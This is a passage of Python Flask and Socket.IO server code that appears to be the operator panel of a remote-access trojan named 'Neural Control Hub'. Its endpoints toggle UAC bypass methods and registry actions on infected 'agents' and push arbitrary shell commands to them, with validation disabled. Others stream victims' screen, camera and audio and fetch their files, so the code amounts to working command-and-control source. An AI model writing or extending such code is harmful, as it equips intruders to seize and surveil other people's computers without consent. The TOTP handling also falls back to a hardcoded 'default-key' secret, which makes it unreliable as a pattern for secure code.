        key = data.get('key')
        enabled = data.get('enabled')
        global_enabled = data.get('global_enabled')
        agent_id = data.get('agent_id')
        
        # Log the request for debugging
        logger.info(f"Registry toggle request - agent_id: {agent_id}, key: {key}, enabled: {enabled}, global_enabled: {global_enabled}")
        
        # Validate input
        if not data:
            logger.warning("Empty request data for registry toggle")
            return jsonify({'success': False, 'error': 'Missing request data'}), 400
            
        # For global operations, key and enabled can be None, but we need at least one of: key, enabled, or global_enabled
        if key is None and enabled is None and global_enabled is None:
            logger.warning("Missing parameters for registry toggle - need at least key, enabled, or global_enabled")
            return jsonify({'success': False, 'error': 'Missing required parameters'}), 400
            
        if key is not None and not isinstance(key, str):
            logger.warning(f"Invalid key type for registry toggle: {type(key)}")
            return jsonify({'success': False, 'error': 'Invalid key format'}), 400
            
        if enabled is not None and not isinstance(enabled, bool):
            logger.warning(f"Invalid enabled type for registry toggle: {type(enabled)}")
            return jsonify({'success': False, 'error': 'Invalid enabled format'}), 400
            
        if agent_id and not isinstance(agent_id, str):
            logger.warning(f"Invalid agent_id type for registry toggle: {type(agent_id)}")
            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
            
        if global_enabled is not None and not isinstance(global_enabled, bool):
            logger.warning(f"Invalid global_enabled type for registry toggle: {type(global_enabled)}")
            return jsonify({'success': False, 'error': 'Invalid global_enabled format'}), 400
        
        # Check admin privileges for registry operations
        if agent_id:
            need_admin = not bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
            if need_admin:
                logger.warning(f"Agent {agent_id} lacks admin privileges for registry operation")
                return jsonify({'success': False, 'error': 'Admin privileges required', 'need_admin': True}), 403
        
        # Apply changes to agent client if available
        if agent_client:
            if isinstance(global_enabled, bool):
                try:
                    agent_client.REGISTRY_ENABLED = global_enabled
                    logger.info(f"Updated global registry to {global_enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update global registry in agent client: {e}")
                    
            if key:
                try:
                    agent_client.REGISTRY_ACTIONS[key] = enabled
                    logger.info(f"Updated registry action {key} to {enabled} in agent client")
                except Exception as e:
                    logger.error(f"Failed to update registry action {key} in agent client: {e}")
                    
        # Apply changes to agent overrides
        if agent_id:
            if isinstance(global_enabled, bool):
                AGENT_OVERRIDES['flags']['registry'][agent_id] = global_enabled
                logger.info(f"Updated global registry flag for agent {agent_id} to {global_enabled}")
            if key:
                AGENT_OVERRIDES['registry'].setdefault(agent_id, {})[key] = enabled
                logger.info(f"Updated registry action {key} for agent {agent_id} to {enabled}")
                
        # Get current state
        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
        g_enabled = bool(getattr(agent_client, 'REGISTRY_ENABLED', False))
        
        if agent_id:
            g_enabled = bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False))
            merged = {a['key']: a['enabled'] for a in actions}
            merged.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
            actions = [{'key': k, 'enabled': bool(v)} for k, v in merged.items()]
            logger.info(f"Returning merged registry state for agent {agent_id}: {len(actions)} actions, global_enabled: {g_enabled}")
        else:
            logger.info(f"Returning global registry state: {len(actions)} actions, global_enabled: {g_enabled}")
            
        try:
            if agent_id:
                _emit_agent_config(agent_id)
            else:
                for _aid, _data in AGENTS_DATA.items():
                    if _data.get('sid'):
                        _emit_agent_config(_aid)
        except Exception:
            pass
        return jsonify({'success': True, 'actions': actions, 'global_enabled': g_enabled})
        
    except Exception as e:
        logger.error(f"Error in api_system_registry_toggle: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/api/system/agent/status', methods=['POST'])
def api_system_agent_status():
    try:
        data = request.get_json(silent=True) or {}
        agent_id = str(data.get('agent_id') or '')
        methods = _parse_dict_from_client('UAC_BYPASS_METHODS_ENABLED')
        actions = _parse_dict_from_client('REGISTRY_ACTIONS')
        if agent_id:
            m = {m['key']: m['enabled'] for m in methods}
            a = {a['key']: a['enabled'] for a in actions}
            m.update(AGENT_OVERRIDES['bypasses'].get(agent_id, {}))
            a.update(AGENT_OVERRIDES['registry'].get(agent_id, {}))
            methods = [{'key': k, 'enabled': bool(v)} for k, v in m.items()]
            actions = [{'key': k, 'enabled': bool(v)} for k, v in a.items()]
        return jsonify({
            'success': True,
            'methods': methods,
            'actions': actions,
            'global_bypasses': bool(AGENT_OVERRIDES['flags']['bypasses'].get(agent_id, False)),
            'global_registry': bool(AGENT_OVERRIDES['flags']['registry'].get(agent_id, False)),
            'admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False)),
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/agent/admin', methods=['POST'])
def api_system_agent_admin():
    try:
        data = request.get_json(silent=True) or {}
        agent_id = data.get('agent_id')
        admin_enabled = data.get('admin_enabled')
        
        # Log the request for debugging
        logger.info(f"Agent admin status update - agent_id: {agent_id}, admin_enabled: {admin_enabled}")
        
        # Validate input
        if not agent_id:
            logger.warning("Missing agent_id for admin status update")
            return jsonify({'success': False, 'error': 'Missing agent_id'}), 400
            
        if not isinstance(agent_id, str):
            logger.warning(f"Invalid agent_id type: {type(agent_id)}")
            return jsonify({'success': False, 'error': 'Invalid agent_id format'}), 400
            
        if not isinstance(admin_enabled, bool):
            logger.warning(f"Invalid admin_enabled type: {type(admin_enabled)}")
            return jsonify({'success': False, 'error': 'Invalid admin_enabled format'}), 400
        
        # Update admin status
        AGENT_OVERRIDES['admin'][agent_id] = admin_enabled
        logger.info(f"Updated admin status for agent {agent_id} to {admin_enabled}")
        
        # Clear cache for agents endpoint to ensure fresh data
        cache.delete('view//api/agents')
        logger.info(f"Cleared agents cache after admin status update")
        
        # Emit real-time update to all connected clients
        socketio.emit('agent_privilege_update', {
            'agent_id': agent_id,
            'is_admin': admin_enabled,
            'timestamp': time.time()
        })
        logger.info(f"Emitted privilege update for agent {agent_id}")
        
        return jsonify({
            'success': True,
            'agent_id': agent_id,
            'admin_enabled': admin_enabled
        })
        
    except Exception as e:
        logger.error(f"Error in api_system_agent_admin: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/api/auth/totp/enroll', methods=['POST'])
def api_totp_enroll():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    password = request.json.get('password')
    if not password:
        return jsonify({'error': 'Password is required'}), 400
    if not verify_admin_or_operator(password):
        return jsonify({'error': 'Invalid password'}), 401
    s = load_settings()
    auth = s.get('authentication', {})
    issuer = auth.get('issuer') or 'Neural Control Hub'
    supa_token = request.headers.get('X-Supabase-Token') or (request.json.get('supabase_token') if request.is_json else None)
    secret = None
    if SUPABASE_URL:
        already = supa_token and supabase_rpc_user('get_totp_ciphertext_for_login', {}, supa_token)
        if not already:
            # Fallback to admin user when JWT is missing
            already = supabase_rpc('get_totp_ciphertext_for_login_admin', {'user_uuid': ADMIN_USER_ID})
        if already:
            return jsonify({'error': 'Already enrolled'}), 403
        pre = supa_token and supabase_rpc_user('get_totp_setup_ciphertext', {}, supa_token)
        if not pre:
            pre = supabase_rpc('get_totp_setup_ciphertext_admin', {'user_uuid': ADMIN_USER_ID})
        if pre:
            try:
                b64 = pre if isinstance(pre, str) else str(pre)
                blob = base64.b64decode(b64)
                obj = json.loads(blob.decode('utf-8'))
                enc, salt = obj.get('enc'), obj.get('salt')
                secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            except Exception:
                return jsonify({'error': 'Secret corrupted'}), 500
        else:
            secret = pyotp.random_base32()
            enc, salt = encrypt_secret(secret, Config.SECRET_KEY or 'default-key')
            payload_text = json.dumps({'enc': enc, 'salt': salt})
            payload_b64 = base64.b64encode(payload_text.encode('utf-8')).decode('utf-8')
            if supa_token:
                res = supabase_rpc_user('start_totp_setup', {'secret_cipher': payload_b64}, supa_token)
            else:
                res = supabase_rpc('start_totp_setup_admin', {'user_uuid': ADMIN_USER_ID, 'secret_cipher': payload_b64})
            if not res and res is not None:
                return jsonify({'error': 'Failed to start TOTP setup'}), 500
    else:
        enc = auth.get('totpSecretEnc')
        salt = auth.get('totpSalt')
        if not enc or not salt:
            secret = pyotp.random_base32()
            enc, salt = encrypt_secret(secret, Config.SECRET_KEY or 'default-key')
            auth['totpSecretEnc'] = enc
            auth['totpSalt'] = salt
            auth['totpCreatedAt'] = datetime.datetime.now().isoformat()
            auth['totpFailedAttempts'] = 0
            s['authentication'] = auth
            save_settings(s)
        else:
            secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            if not secret:
                return jsonify({'error': 'Secret corrupted'}), 500
    uri = pyotp.TOTP(secret).provisioning_uri(name='operator', issuer_name=issuer)
    return jsonify({'success': True, 'secret': secret, 'uri': uri})

@app.route('/api/auth/totp/verify', methods=['POST'])
def api_totp_verify():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    otp_raw = request.json.get('otp')
    otp = re.sub(r'\D', '', str(otp_raw or ''))[:6]
    if not otp:
        return jsonify({'error': 'OTP is required'}), 400
    all_settings = load_settings()
    cfg = all_settings.get('authentication', {})
    supa_token = request.headers.get('X-Supabase-Token') or (request.json.get('supabase_token') if request.is_json else None)
    secret = None
    if SUPABASE_URL:
        live = supa_token and supabase_rpc_user('get_totp_ciphertext_for_login', {}, supa_token)
        if not live:
            live = supabase_rpc('get_totp_ciphertext_for_login_admin', {'user_uuid': ADMIN_USER_ID})
        if live:
            try:
                b64 = live if isinstance(live, str) else str(live)
                blob = base64.b64decode(b64)
                obj = json.loads(blob.decode('utf-8'))
                enc, salt = obj.get('enc'), obj.get('salt')
                secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            except Exception:
                return jsonify({'error': 'Secret missing'}), 400
        else:
            setup = supa_token and supabase_rpc_user('get_totp_setup_ciphertext', {}, supa_token)
            if not setup:
                setup = supabase_rpc('get_totp_setup_ciphertext_admin', {'user_uuid': ADMIN_USER_ID})
            if not setup:
                return jsonify({'error': 'Two-factor not enrolled'}), 400
            try:
                b64 = setup if isinstance(setup, str) else str(setup)
                blob = base64.b64decode(b64)
                obj = json.loads(blob.decode('utf-8'))
                enc, salt = obj.get('enc'), obj.get('salt')
                secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
            except Exception:
                return jsonify({'error': 'Secret missing'}), 400
    else:
        enc = cfg.get('totpSecretEnc')
        salt = cfg.get('totpSalt')
        if not enc or not salt:
            return jsonify({'error': 'Two-factor not enrolled'}), 400
        secret = decrypt_secret(enc, salt, Config.SECRET_KEY or 'default-key')
        if not secret:
            return jsonify({'error': 'Secret missing'}), 400
    ok = verify_totp_code(secret, str(otp), window=1)
    if not ok:
        return jsonify({'error': 'Invalid OTP'}), 401
    session['otp_verified'] = True
    if SUPABASE_URL:
        if supa_token:
            supabase_rpc_user('confirm_totp_setup', {}, supa_token)
        else:
            supabase_rpc('confirm_totp_setup_admin', {'user_uuid': ADMIN_USER_ID})
        return jsonify({'success': True, 'enabled': True})
    else:
        cfg['totpEnabled'] = True
        cfg['totpVerifiedOnce'] = True
        cfg['totpFailedAttempts'] = 0
        all_settings['authentication'] = cfg
        save_settings(all_settings)
        return jsonify({'success': True, 'enabled': True})

@app.route('/api/auth/totp/unlock', methods=['POST'])
def api_totp_unlock():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    password = request.json.get('password')
    if not password or not verify_admin_or_operator(password):
        return jsonify({'error': 'Invalid password'}), 401
    all_settings = load_settings()
    cfg = all_settings.get('authentication', {})
    cfg['totpFailedAttempts'] = 0
    cfg['totpLastAttemptAt'] = None
    all_settings['authentication'] = cfg
    save_settings(all_settings)
    return jsonify({'success': True})

@app.route('/api/auth/totp/reset', methods=['POST'])
def api_totp_reset():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    password = request.json.get('password')
    if not password or not verify_admin_or_operator(password):
        return jsonify({'error': 'Invalid password'}), 401
    all_settings = load_settings()
    cfg = all_settings.get('authentication', {})
    cfg.pop('totpSecretEnc', None)
    cfg.pop('totpSalt', None)
    cfg['totpEnabled'] = False
    cfg['totpVerifiedOnce'] = False
    cfg['totpFailedAttempts'] = 0
    cfg['totpCreatedAt'] = None
    all_settings['authentication'] = cfg
    save_settings(all_settings)
    return jsonify({'success': True})

@app.route('/api/auth/device/trust-status', methods=['GET'])
@require_auth
def api_trusted_device_status():
    cfg = load_settings().get('authentication', {})
    token = request.cookies.get('trusted_device')
    trusted = False
    if token:
        try:
            h = hashlib.sha256(token.encode()).hexdigest()
            trusted = h in (cfg.get('trustedDevices') or [])
        except Exception:
            trusted = False
    return jsonify({'trusted': trusted})

@app.route('/api/auth/device/trust', methods=['POST'])
@require_auth
def api_trusted_device_toggle():
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    desired = bool(request.json.get('trust'))
    s = load_settings()
    auth = s.get('authentication', {})
    ssl = bool(s.get('server', {}).get('sslEnabled'))
    if desired:
        token = secrets.token_urlsafe(32)
        h = hashlib.sha256(token.encode()).hexdigest()
        lst = auth.get('trustedDevices') or []
        if h not in lst:
            lst.append(h)
            auth['trustedDevices'] = lst
            s['authentication'] = auth
            save_settings(s)
        resp = jsonify({'success': True, 'trusted': True})
        resp.set_cookie('trusted_device', token, max_age=30*24*3600, httponly=True, samesite='Lax', secure=ssl, path='/')
        return resp
    else:
        existing = request.cookies.get('trusted_device')
        if existing:
            try:
                h = hashlib.sha256(existing.encode()).hexdigest()
                lst = auth.get('trustedDevices') or []
                if h in lst:
                    lst = [x for x in lst if x != h]
                    auth['trustedDevices'] = lst
                    s['authentication'] = auth
                    save_settings(s)
            except Exception:
                pass
        resp = jsonify({'success': True, 'trusted': False})
        resp.set_cookie('trusted_device', '', max_age=0, httponly=True, samesite='Lax', secure=ssl, path='/')
        return resp

# --- NEW API ENDPOINTS FOR MODERN UI ---

# Agent Management API
def _load_agent_alias(agent_id: str):
    try:
        base_dir = os.path.join(os.getcwd(), 'agents', agent_id)
        path = os.path.join(base_dir, 'alias')
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                s = f.read().strip()
                if s:
                    return s
        try:
            agent_name = str(AGENTS_DATA.get(agent_id, {}).get('name') or f'Agent-{agent_id}')
            safe_base = re.sub(r'[^A-Za-z0-9._-]+', '_', agent_name).strip('_') or f'Agent_{agent_id}'
            legacy_dir = os.path.join(os.getcwd(), 'aliases')
            legacy_path = os.path.join(legacy_dir, f"{safe_base}.alias")
            if os.path.exists(legacy_path):
                with open(legacy_path, 'r', encoding='utf-8') as f:
                    s = f.read().strip()
                    if s:
                        return s
        except Exception:
            pass
        return None
    except Exception:
        return None
@app.route('/api/agents', methods=['GET'])
@require_auth
@cache.cached(timeout=5)
def get_agents():
    """Get list of all agents with their status and performance metrics"""
    agents = []
    for agent_id, data in AGENTS_DATA.items():
        agent_info = {
            'id': agent_id,
            'name': data.get('name', f'Agent-{agent_id}'),
            'alias': data.get('alias') or _load_agent_alias(agent_id),
            'status': 'online' if data.get('sid') else 'offline',
            'platform': data.get('platform', 'Unknown'),
            'ip': data.get('ip', '0.0.0.0'),
            'last_seen': data.get('last_seen'),
            'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
            'performance': {
                'cpu': data.get('cpu_usage', 0),
                'memory': data.get('memory_usage', 0),
                'network': data.get('network_usage', 0)
            },
            'is_admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
        }
        agents.append(agent_info)
    
    return jsonify({
        'agents': agents,
        'total_count': len(agents),
        'online_count': len([a for a in agents if a['status'] == 'online'])
    })

@app.route('/api/agents/<agent_id>', methods=['GET'])
@require_auth
def get_agent_details(agent_id):
    """Get detailed information about a specific agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    data = AGENTS_DATA[agent_id]
    agent_info = {
        'id': agent_id,
        'name': data.get('name', f'Agent-{agent_id}'),
        'alias': data.get('alias') or _load_agent_alias(agent_id),
        'status': 'online' if data.get('sid') else 'offline',
        'platform': data.get('platform', 'Unknown'),
        'ip': data.get('ip', '0.0.0.0'),
        'last_seen': data.get('last_seen'),
        'capabilities': data.get('capabilities', ['screen', 'files', 'commands']),
        'performance': {
            'cpu': data.get('cpu_usage', 0),
            'memory': data.get('memory_usage', 0),
            'network': data.get('network_usage', 0)
        },
        'system_info': data.get('system_info', {}),
        'uptime': data.get('uptime', 0),
        'is_admin': bool(AGENT_OVERRIDES['admin'].get(agent_id, False))
    }
    
    return jsonify(agent_info)

@app.route('/api/agents/<agent_id>/alias', methods=['POST'])
@require_auth
def set_agent_alias(agent_id):
    try:
        if agent_id not in AGENTS_DATA:
            return jsonify({'success': False, 'error': 'Agent not found'}), 404
        if not request.is_json:
            return jsonify({'success': False, 'error': 'JSON payload required'}), 400
        raw = str((request.json or {}).get('alias') or '').strip()
        alias = sanitize_input(raw)
        base_dir = os.path.join(os.getcwd(), 'agents', agent_id)
        try:
            os.makedirs(base_dir, exist_ok=True)
        except Exception:
            pass
        filename = 'alias'
        path = os.path.join(base_dir, filename)
        if alias:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(alias)
            except Exception as e:
                return jsonify({'success': False, 'error': f'Failed to write alias file: {e}'}), 500
            AGENTS_DATA[agent_id]['alias'] = alias
        else:
            try:
                if os.path.exists(path):
                    os.remove(path)
            except Exception:
                pass
            try:
                agent_name = str(AGENTS_DATA.get(agent_id, {}).get('name') or f'Agent-{agent_id}')
                safe_base = re.sub(r'[^A-Za-z0-9._-]+', '_', agent_name).strip('_') or f'Agent_{agent_id}'
                legacy_dir = os.path.join(os.getcwd(), 'aliases')
                legacy_path = os.path.join(legacy_dir, f"{safe_base}.alias")
                if os.path.exists(legacy_path):
                    os.remove(legacy_path)
            except Exception:
                pass
            try:
                if 'alias' in AGENTS_DATA.get(agent_id, {}):
                    del AGENTS_DATA[agent_id]['alias']
            except Exception:
                pass
        cache.delete('view//api/agents')
        socketio.emit('agent_alias_update', {'agent_id': agent_id, 'alias': alias, 'filename': filename, 'timestamp': time.time()}, room='operators')
        socketio.emit('agent_list_update', _agents_payload(), room='operators')
        return jsonify({'success': True, 'agent_id': agent_id, 'alias': alias, 'file': filename})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/agents/<agent_id>/token/generate', methods=['POST'])
@require_auth
def generate_token_endpoint(agent_id):
    if not agent_id:
        return jsonify({'error': 'Agent ID required'}), 400
    token = generate_agent_token(agent_id)
    return jsonify({'agent_id': agent_id, 'token': token})

# Streaming Control API
@app.route('/api/agents/<agent_id>/stream/<stream_type>/start', methods=['POST'])
@require_auth
def start_stream(agent_id, stream_type):
    """Start a stream (screen, camera, or audio) for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    if stream_type not in ['screen', 'camera', 'audio']:
        return jsonify({'error': 'Invalid stream type'}), 400
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    quality = request.json.get('quality', 'high') if request.is_json else 'high'
    mode = request.json.get('mode', 'realtime') if request.is_json else 'realtime'
    fps = int(request.json.get('fps', 10)) if request.is_json else 10
    buffer_frames = int(request.json.get('buffer_frames', 30)) if request.is_json else 30
    
    # Emit to agent
    socketio.emit('start_stream', {
        'type': stream_type,
        'quality': quality
    }, room=agent_sid)
    try:
        if stream_type == 'screen':
            if quality == 'low':
                params = {'type': 'screen', 'fps': fps, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 12}
            elif quality == 'medium':
                params = {'type': 'screen', 'fps': fps, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
            elif quality == 'high':
                params = {'type': 'screen', 'fps': fps, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
            else:
                params = {'type': 'screen', 'fps': fps, 'max_width': 1920, 'jpeg_quality': 75, 'delta': True, 'tile_size': 64, 'diff_threshold': 5}
            socketio.emit('set_stream_params', params, room=agent_sid)
        elif stream_type == 'camera':
            socketio.emit('set_stream_params', {'type': 'camera', 'fps': fps}, room=agent_sid)
    except Exception:
        pass
    if stream_type == 'screen':
        STREAM_PLAYBACK_MODE_SCREEN[agent_id] = mode
        STREAM_PLAYBACK_FPS_SCREEN[agent_id] = fps
        STREAM_BUFFER_FRAMES_SCREEN[agent_id] = buffer_frames
        if mode == 'buffered':
            _ensure_buffered_emitter(agent_id, 'screen')
        else:
            STREAM_FRAME_BUFFER_SCREEN[agent_id].clear()
    elif stream_type == 'camera':
        STREAM_PLAYBACK_MODE_CAMERA[agent_id] = mode
        STREAM_PLAYBACK_FPS_CAMERA[agent_id] = fps
        STREAM_BUFFER_FRAMES_CAMERA[agent_id] = buffer_frames
        if mode == 'buffered':
            _ensure_buffered_emitter(agent_id, 'camera')
        else:
            STREAM_FRAME_BUFFER_CAMERA[agent_id].clear()
    
    return jsonify({
        'success': True,
        'message': f'{stream_type.title()} stream started',
        'agent_id': agent_id,
        'stream_type': stream_type,
        'quality': quality,
        'mode': mode,
        'fps': fps,
        'buffer_frames': buffer_frames
    })

@app.route('/api/agents/<agent_id>/stream/<stream_type>/stop', methods=['POST'])
@require_auth
def stop_stream(agent_id, stream_type):
    """Stop a stream for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    if stream_type not in ['screen', 'camera', 'audio']:
        return jsonify({'error': 'Invalid stream type'}), 400
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    # Emit to agent
    socketio.emit('stop_stream', {
        'type': stream_type
    }, room=agent_sid)
    if stream_type == 'screen':
        STREAM_PLAYBACK_MODE_SCREEN[agent_id] = 'realtime'
        STREAM_FRAME_BUFFER_SCREEN[agent_id].clear()
    elif stream_type == 'camera':
        STREAM_PLAYBACK_MODE_CAMERA[agent_id] = 'realtime'
        STREAM_FRAME_BUFFER_CAMERA[agent_id].clear()
    
    return jsonify({
        'success': True,
        'message': f'{stream_type.title()} stream stopped',
        'agent_id': agent_id,
        'stream_type': stream_type
    })

@socketio.on('set_stream_mode')
def handle_set_stream_mode(data):
    agent_id = str(data.get('agent_id') or '')
    stream_type = str(data.get('type') or 'screen')
    mode = str(data.get('mode') or 'realtime')
    fps = int(data.get('fps') or 10)
    buffer_frames = int(data.get('buffer_frames') or 30)
    if not agent_id:
        return
    if stream_type == 'screen':
        STREAM_PLAYBACK_MODE_SCREEN[agent_id] = mode
        STREAM_PLAYBACK_FPS_SCREEN[agent_id] = fps
        STREAM_BUFFER_FRAMES_SCREEN[agent_id] = buffer_frames
        if mode == 'buffered':
            _ensure_buffered_emitter(agent_id, 'screen')
        else:
            STREAM_FRAME_BUFFER_SCREEN[agent_id].clear()
    elif stream_type == 'camera':
        STREAM_PLAYBACK_MODE_CAMERA[agent_id] = mode
        STREAM_PLAYBACK_FPS_CAMERA[agent_id] = fps
        STREAM_BUFFER_FRAMES_CAMERA[agent_id] = buffer_frames
        if mode == 'buffered':
            _ensure_buffered_emitter(agent_id, 'camera')
@socketio.on('set_stream_quality')
def handle_set_stream_quality(data):
    agent_id = str(data.get('agent_id') or '')
    quality = str(data.get('quality') or 'medium')
    if not agent_id or agent_id not in AGENTS_DATA:
        return
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return
    try:
        params = None
        params_low = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 12}
        params_medium = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
        params_high = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
        params_best = {'type': 'screen', 'fps': 25, 'max_width': 1920, 'jpeg_quality': 75, 'delta': True, 'tile_size': 64, 'diff_threshold': 5}
        if quality == 'low':
            params = params_low
        elif quality == 'medium':
            params = params_medium
        elif quality == 'high':
            params = params_high
        else:
            params = params_best
        socketio.emit('set_stream_params', params, room=agent_sid)
    except Exception:
        pass

# Command Execution API
@app.route('/api/agents/<agent_id>/execute', methods=['POST'])
@require_auth
def execute_command(agent_id):
    """Execute a command on an agent"""
    # Input validation
    if not agent_id or not re.match(r'^[a-zA-Z0-9\-_]+$', agent_id):
        return jsonify({'error': 'Invalid agent ID format'}), 400
    
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    agent_sid = AGENTS_DATA[agent_id].get('sid')
    if not agent_sid:
        return jsonify({'error': 'Agent not connected'}), 400
    
    if not request.is_json:
        return jsonify({'error': 'JSON payload required'}), 400
    
    command = request.json.get('command')
    if not command:
        return jsonify({'error': 'Command is required'}), 400
    
    # Validate command length and content
    command = command.strip()
    if len(command) > 1000:
        return jsonify({'error': 'Command too long (max 1000 characters)'}), 400
    # Validation disabled per user request
    
    # Generate execution ID
    execution_id = f"exec_{int(time.time())}_{secrets.token_hex(4)}"
    
    # Emit to agent (match agent listener 'command')
    payload = {'execution_id': execution_id}
    shared_secret = os.environ.get('AGENT_SHARED_SECRET', '')
    if shared_secret:
        try:
            e2e = E2EEncryption(agent_id, shared_secret)
            payload['command'] = e2e.encrypt(command)
            payload['encrypted'] = True
        except Exception:
            payload['command'] = command
    else:
        payload['command'] = command
    socketio.emit('command', payload, room=agent_sid)
    try:
        audit.log_action(session.get('user_id'), 'EXECUTE_COMMAND', agent_id=agent_id, details={'command': command}, severity='WARNING')
    except Exception:
        pass
    
    return jsonify({
        'success': True,
        'execution_id': execution_id,
        'command': command,
        'agent_id': agent_id
    })

@app.route('/api/agents/<agent_id>/commands/history', methods=['GET'])
@require_auth
def get_command_history(agent_id):
    """Get command execution history for an agent"""
    if agent_id not in AGENTS_DATA:
        return jsonify({'error': 'Agent not found'}), 404
    
    # In a real implementation, this would be stored in a database
    # For now, return mock data
    history = [
        {
            'id': 1,
            'command': 'systeminfo',
            'output': 'Host Name: WIN-DESKTOP-01\nOS Name: Microsoft Windows 11...',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'success': True,
            'execution_time': 2.5
        },
        {
            'id': 2,
            'command': 'dir C:\\',
            'output': 'Volume in drive C has no label.\nDirectory of C:\\\n\n...',
            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
            'success': True,
            'execution_time': 1.2
        }
    ]
    
    return jsonify({
        'history': history,
        'total_count': len(history)
    })

_RANGE_RE = re.compile(r'bytes=(\d*)-(\d*)')

def _extract_b64(s):
    if not isinstance(s, str) or not s:
        return None
    return s.split(',', 1)[1] if ',' in s else s

def _guess_mime(path: str):
    # Prefer explicit mappings for modern image types not always present in std mimetypes
    try:
        ext = (os.path.splitext(path)[1] or '').lower().lstrip('.')
    except Exception:
        ext = ''
    custom = {
        'webp': 'image/webp',
        'svg': 'image/svg+xml',
        'bmp': 'image/bmp',
        'ico': 'image/x-icon',
        'tif': 'image/tiff',
        'tiff': 'image/tiff',
        'avif': 'image/avif',
        'heic': 'image/heic',
        'heif': 'image/heif',
        'jfif': 'image/jpeg',
        'jpg': 'image/jpeg',
        'jpeg': 'image/jpeg',
        'png': 'image/png',
        'gif': 'image/gif',
    }
    if ext in custom:
        return custom[ext]
    mime, _ = mimetypes.guess_type(path)
    if mime:
        return mime
    return 'application/octet-stream'

def _request_agent_file_range(agent_id: str, agent_sid: str, file_path: str, start: Optional[int], end: Optional[int], timeout_s: float = 30.0):
    if start == 0 and end == 0:
        cached = get_cached_metadata(agent_id, file_path)
        if cached:
            return cached
    request_id = f"range_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
    ev = threading.Event()
    with FILE_WAITERS_LOCK:
        FILE_RANGE_WAITERS[request_id] = {'event': ev, 'data': None}
    socketio.emit('request_file_range', {
        'agent_id': agent_id,
        'request_id': request_id,
        'path': file_path,
        'start': start,
        'end': end
    }, room=agent_sid)
    ev.wait(timeout_s)
    with FILE_WAITERS_LOCK:
        waiter = FILE_RANGE_WAITERS.pop(request_id, None)
    if not waiter:
        return None
    result = waiter.get('data')
    if result and start == 0 and end == 0 and not result.get('error'):
        set_cached_metadata(agent_id, file_path, result)
    return result

def _request_agent_thumbnail(agent_id: str, agent_sid: str, file_path: str, size: int, timeout_s: float = 20.0):
    request_id = f"thumb_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
    ev = threading.Event()
    with FILE_WAITERS_LOCK:
        FILE_THUMB_WAITERS[request_id] = {'event': ev, 'data': None}
    socketio.emit('request_file_thumbnail', {
        'agent_id': agent_id,
        'request_id': request_id,
        'path': file_path,
        'size': size
    }, room=agent_sid)
    ev.wait(timeout_s)
    with FILE_WAITERS_LOCK:
        waiter = FILE_THUMB_WAITERS.pop(request_id, None)
    if not waiter:
        return None
    return waiter.get('data')

def _request_agent_faststart(agent_id: str, agent_sid: str, file_path: str, force: bool = False, timeout_s: float = 60.0):
    request_id = f"fast_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
    ev = threading.Event()
    with FILE_WAITERS_LOCK:
        FILE_FASTSTART_WAITERS[request_id] = {'event': ev, 'data': None}
    socketio.emit('request_file_faststart', {
        'agent_id': agent_id,
        'request_id': request_id,
        'path': file_path,
        'force': force
    }, room=agent_sid)
    ev.wait(timeout_s)
    with FILE_WAITERS_LOCK:
        waiter = FILE_FASTSTART_WAITERS.pop(request_id, None)
    if not waiter:
        return None
    return waiter.get('data')

# File Management API
@app.route('/api/agents/<agent_id>/files', methods=['GET'])
@require_auth
def browse_files(agent_id):
